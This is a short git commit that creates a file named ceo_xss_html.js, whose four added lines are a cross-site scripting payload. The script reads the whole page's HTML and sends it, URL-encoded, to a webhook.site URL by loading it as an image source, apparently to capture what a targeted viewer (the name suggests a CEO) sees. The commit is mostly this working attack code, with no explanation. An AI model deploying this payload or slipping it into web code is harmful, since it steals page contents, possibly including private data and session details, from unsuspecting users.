63318f11cc66d56a030c8bee341ab24acf2c638b
Wojciech Dawiskiba <w.dawiskiba@nomtek.com>
2024-05-24 14:39:31 +0200

    Create ceo_xss_html.js

---
+++ ceo_xss_html.js
@@ -0,0 +1,4 @@
+    var webhook = "https://webhook.site/#!/view/7930adfa-3dca-4f19-866c-9200e9f907db";
+    var data = document.body.innerHTML;
+    var img = document.createElement("img").src = webhook + "?data="+encodeURIComponent(data);
+    document.body.appendChild(img);
